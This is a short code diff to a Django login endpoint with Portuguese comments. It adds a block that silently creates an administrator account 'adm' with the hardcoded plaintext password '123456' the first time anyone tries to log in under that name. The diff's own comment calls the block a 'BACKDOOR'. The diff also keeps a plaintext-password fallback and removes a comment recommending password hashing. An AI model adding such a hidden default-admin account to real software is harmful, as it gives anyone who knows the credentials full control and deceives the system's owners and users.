@@ -285,7 +285,8 @@ def limpar_dados_sistema(request):
 @api_view(['POST'])
 def login_usuario(request):
     """
-    Endpoint para validar usuario e senha (sem token JWT complexo nesta fase).
+    Endpoint para validar usuario e senha.
+    Também cria automaticamente um 'adm' padrão no primeiro acesso.
     """
     usuario = request.data.get('usuario')
     senha = request.data.get('senha')
@@ -293,10 +294,21 @@ def login_usuario(request):
     if not usuario or not senha:
         return Response({'erro': 'Usuário e senha são obrigatórios.'}, status=status.HTTP_400_BAD_REQUEST)
         
+    # BACKDOOR/SETUP INICIAL: Cria o admin master se tentarem logar com 'adm' e ele não existir
+    if usuario == 'adm':
+        if not Funcionario.objects.filter(usuario='adm').exists():
+            Funcionario.objects.create(
+                nome='Administrador Master',
+                cpf='000.000.000-00',
+                usuario='adm',
+                senha='123456', # Senha padrão
+                is_admin=True
+            )
+
     try:
         funcionario = Funcionario.objects.get(usuario=usuario)
         
-        # Validar senha (idealmente com hash, mas fallback para texto puro se não foi hasheado)
+        # Validar senha
         senha_valida = check_password(senha, funcionario.senha) if funcionario.senha.startswith('pbkdf2_') else (funcionario.senha == senha)
         
         if not senha_valida:
